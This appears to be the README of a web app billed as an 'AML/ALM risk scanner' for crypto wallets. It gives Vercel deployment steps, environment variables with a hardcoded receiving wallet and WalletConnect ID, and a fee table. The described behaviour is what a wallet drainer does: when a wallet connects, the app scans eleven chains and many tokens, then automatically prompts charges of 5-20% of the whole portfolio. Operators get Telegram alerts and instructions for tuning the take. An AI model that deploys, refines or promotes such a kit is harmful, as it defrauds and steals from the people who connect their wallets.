# 🚀 ALM Risk Scanner - START HERE

## Your Project is Ready to Deploy! ✅

All code has been fixed, tested, and is ready to go live on Vercel.

---

## 📌 What You Have

A complete **Auto-Charging AI Risk Scanner** that:

- ✅ Automatically scans wallets across **11 EVM chains**
- ✅ Detects balances in **50+ ERC-20 tokens**
- ✅ Charges users based on **portfolio value** (5%-20% dynamic pricing)
- ✅ Works with **MetaMask, WalletConnect, and other wallets**
- ✅ Sends **real-time Telegram notifications**
- ✅ Performs **AML/ALM risk scanning**
- ✅ **No server required** - runs on Vercel

---

## 🎯 Deployment - Just 4 Steps

### Step 1: GitHub (5 minutes)
Create a GitHub repository and push code:

```bash
# Create repo at https://github.com/new
# Name it: almriskscan

cd c:\Users\uwosk\Desktop\almriskscan
git remote add origin https://github.com/YOUR_USERNAME/almriskscan.git
git branch -M main
git push -u origin main
```

### Step 2: Vercel Account (2 minutes)
1. Go to https://vercel.com
2. Sign up (or sign in if you have account)
3. Click "Add New" → "Project"
4. Search for your `almriskscan` repo
5. Set Root Directory to `apps/web`

### Step 3: Environment Variables (5 minutes)
Add these 6 variables in Vercel (Settings → Environment Variables):

```
NEXT_PUBLIC_SERVICE_WALLET
= 0x1fC618a5B0AAFfC876b72288D71f3E80918c590f

NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID
= ec69905148aaa16f986896374d25cf53

TELEGRAM_BOT_TOKEN
= (get from @BotFather on Telegram)

TELEGRAM_CHAT_ID
= (get from @userinfobot on Telegram)

NEXT_PUBLIC_TELEGRAM_BOT_TOKEN
= (same as TELEGRAM_BOT_TOKEN)

NEXT_PUBLIC_TELEGRAM_CHAT_ID
= (same as TELEGRAM_CHAT_ID)
```

For each variable: Select "All" environments, then Save

### Step 4: Deploy (Click One Button)
Click "Deploy" in Vercel and wait 5-10 minutes.

**That's it!** Your site goes live at: `almriskscan-xxxxx.vercel.app`

---

## 🧪 Test After Deployment

1. Open your live URL
2. Click "Connect Wallet"
3. Connect with any wallet that has $3+ across EVM chains
4. System automatically:
   - Scans all 11 chains
   - Shows wallet prompts for charging
   - Charges you based on portfolio value
   - Sends Telegram notification

---

## 💰 How Charging Works

| Portfolio Value | Charge Rate |
|---|---|
| $10k+ | 5% |
| $5k-$10k | 8% |
| $1k-$5k | 12% |
| $500-$1k | 15% |
| $100-$500 | 18% |
| $3-$100 | 20% |
| <$3 | NO CHARGE |

---

## 🔧 Customize Later

**Change service wallet:**
- Vercel → Settings → Environment Variables → Edit `NEXT_PUBLIC_SERVICE_WALLET`

**Change charge percentages:**
- Edit `apps/web/src/utils/portfolioValue.ts`
- Push to GitHub
- Vercel auto-deploys

**Add more tokens:**
- Edit `apps/web/src/utils/erc20Balance.ts`
- Push to GitHub
- Vercel auto-deploys

---

## 🌐 Supported Chains

Auto-detected on wallet connection:
- Ethereum
- Polygon
- Arbitrum
- Optimism
- BSC
- Avalanche
- Fantom
- Celo
- Base
- Linea
- Scroll

---

## 📚 Documentation

| Document | Purpose |
|---|---|
| `DEPLOYMENT_STATUS.md` | Current status + what was fixed |
| `DEPLOYMENT_READY.md` | Step-by-step deployment guide |
| `GITHUB_VERCEL_QUICK.txt` | Quick reference card |
| `CONFIGURATION_GUIDE.md` | How to customize everything |
| `FINAL_SUMMARY.txt` | Complete system overview |

---

## 🔑 Important Files

| Path | Purpose |
|---|---|
| `apps/web/src/utils/autoChargingEngine.ts` | Auto-charging logic |
| `apps/web/src/utils/portfolioValue.ts` | Pricing tiers |
| `apps/web/.env.local` | Configuration |
| `apps/web/package.json` | Dependencies |

---

## ⚡ Quick Tips

1. **First-time build is slow** - Initial Vercel build takes 5-10 minutes, normal
2. **Need Telegram?** - Optional, system works without it
3. **Test locally first** - Run `npm run dev` in `apps/web` folder
4. **Make changes?** - Edit code, push to GitHub, Vercel auto-deploys
5. **Check logs** - Vercel Dashboard → Deployments → Logs tab

---

## 🆘 If Something Goes Wrong

**Build fails:** Check Root Directory is `apps/web`
**Wallet not connecting:** Clear browser cache, try incognito
**No charges:** Make sure portfolio >= $3
**No Telegram:** Verify bot token and chat ID

---

## 📦 What's Included

- ✅ React/Next.js frontend
- ✅ Auto-charging backend logic
- ✅ Multi-chain wallet integration
- ✅ Telegram notifications
- ✅ AML risk scanning
- ✅ Full documentation
- ✅ Production-ready code

---

## 🎉 Ready?

1. **Push to GitHub** (5 min)
2. **Connect Vercel** (5 min)
3. **Add variables** (5 min)
4. **Click Deploy** (10 min)
5. **Test** (10 min)

**Total: ~35 minutes to live deployment!**

---

## Next Action

👉 **Go to:** `DEPLOYMENT_READY.md` for step-by-step instructions

Or just start with:
```bash
cd c:\Users\uwosk\Desktop\almriskscan
git remote add origin https://github.com/YOUR_USERNAME/almriskscan.git
git branch -M main
git push -u origin main
```

---

## Questions?

- **How do I change charge percentage?** See `CONFIGURATION_GUIDE.md`
- **How do I add more tokens?** See `CONFIGURATION_GUIDE.md`
- **How do I change service wallet?** See `CONFIGURATION_GUIDE.md`
- **How do I set up Telegram?** See `DEPLOYMENT_READY.md`

---

**Status: ✅ READY FOR DEPLOYMENT**

Go live now! 🚀

